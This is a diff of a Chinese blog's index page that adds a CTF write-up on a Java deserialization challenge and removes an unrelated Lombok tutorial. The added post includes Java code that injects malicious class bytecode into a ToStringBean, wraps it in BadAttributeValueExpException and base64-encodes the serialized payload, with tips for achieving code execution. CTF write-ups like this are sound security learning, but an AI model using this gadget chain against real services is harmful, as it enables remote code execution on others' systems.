@@ -188,6 +188,85 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/%E5%91%A8%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/18/%E5%91%A8%E9%A2%98/" class="post-title-link" itemprop="url">周题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-18 15:14:16 / 修改时间：22:09:26" itemprop="dateCreated datePublished" datetime="2022-03-18T15:14:16+08:00">2022-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="ezgaeget（东华杯）"><a href="#ezgaeget（东华杯）" class="headerlink" title="ezgaeget（东华杯）"></a>ezgaeget（东华杯）</h3><p>本题是一道关于java反序列化的题目</p>
+<p>题目有一个jar包,通过Java Decompiler打开,查看里面的类,发现一个类ToStringBean,它的toString方法不但能从字节码加载类,并且还能帮助类继续实例化,所以这就是代码执行的地方了,想办法将ClassByte换成恶意类的字节码即可</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220318151601653.png" alt="image-20220318151601653"></p>
+<p>并且在IndexController这个Controller类中发现了能进行反序列化的地方</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220318151834640.png" alt="image-20220318151834640"></p>
+<p>java中ObjectInputStream.readObject其实就是反序列化的方法</p>
+<p>所以现在思路确定下来,首先构造恶意类,让其中的readObject可以调用参数的toString方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先通过字节码获取对应类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\javaSecurity\\cc\\target\\test-classes\\test.class&quot;</span>));</span><br><span class="line">        ToStringBean toStringBean = <span class="keyword">new</span> ToStringBean();</span><br><span class="line">        Class&lt;? extends ToStringBean&gt; toStringBeanClass = toStringBean.getClass();</span><br><span class="line">        Field classByte = toStringBeanClass.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        classByte.set(toStringBean,bytes);</span><br><span class="line">        <span class="comment">//现在代码执行的地方已经封装好了,接下来就是构造反序列化时候能调用toString,恰好BadAttributeValueExpException的readObject会调用toString</span></span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//此处有个坑,就是BadAttributeValueExpException的构造方法会先执行toString,所以通过反射在实例化后再次修改</span></span><br><span class="line">        Class&lt;? extends BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line">        Field val = badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">        <span class="comment">//构造完成,接下来只需要构造base64编码的字节流</span></span><br><span class="line">        </span><br><span class="line">        ByteOutputStream byteOutputStream=<span class="keyword">new</span> ByteOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(byteOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes1=byteOutputStream.toByteArray();</span><br><span class="line">        </span><br><span class="line">        System.out.println(Tools.base64Encode(bytes1));</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>起初没有保证序列化之前的包名一致,导致无法正常反序列化,反序列化的时候必须保证反序列化的类所在的包名一样</p>
+<p>还有一个坑点,就是base64在传的时候,记得先urlencode一次,防止将+当成空格去传,但是解码的时候又把空格当成base64来解码,所以会报<code>Illegal base64 character 20</code>错误</p>
+<p>传入data为打印出的字符串,成功执行代码</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/14/CommonsCollections/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1366,86 +1445,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lombok%E5%B0%8F%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/01/lombok%E5%B0%8F%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">lombok小工具</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-02-01 20:21:01 / 修改时间：20:45:23" itemprop="dateCreated datePublished" datetime="2022-02-01T20:21:01+08:00">2022-02-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>使用这款小工具可以通过添加注解来实现类的构造方法,set,get方法,让代码更简洁</p>
-<h3 id="导入maven依赖"><a href="#导入maven依赖" class="headerlink" title="导入maven依赖"></a>导入maven依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span>     <span class="comment">//添加get,set方法</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span><span class="comment">//无参构造</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span><span class="comment">//全参构造</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装lombok插件"><a href="#安装lombok插件" class="headerlink" title="安装lombok插件"></a>安装lombok插件</h3><p>IDEAsetting里面一直无法下载插件</p>
-<p>IDEA官网下载链接,下载后直接安装就行</p>
-<p><a target="_blank" rel="noopener" href="https://plugins.jetbrains.com/plugin/6317-lombok">https://plugins.jetbrains.com/plugin/6317-lombok</a></p>
-<p>idea2020.1.1版本的</p>
-<p><a target="_blank" rel="noopener" href="https://plugins.jetbrains.com/files/6317/100775/lombok-plugin-0.33-2020.1.zip?updateId=100775&amp;pluginId=6317&amp;family=INTELLIJ">https://plugins.jetbrains.com/files/6317/100775/lombok-plugin-0.33-2020.1.zip?updateId=100775&amp;pluginId=6317&amp;family=INTELLIJ</a></p>
-<h3 id="开启AnnocationProcessors"><a href="#开启AnnocationProcessors" class="headerlink" title="开启AnnocationProcessors"></a>开启AnnocationProcessors</h3><p>点击File– Settings设置界面，开启 AnnocationProcessors：</p>
-<p>按下alt+7即可看到已经生成了对应的构造器和get,set方法</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220201204237651.png" alt="image-20220201204237651"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1517,7 +1516,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-count">55</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
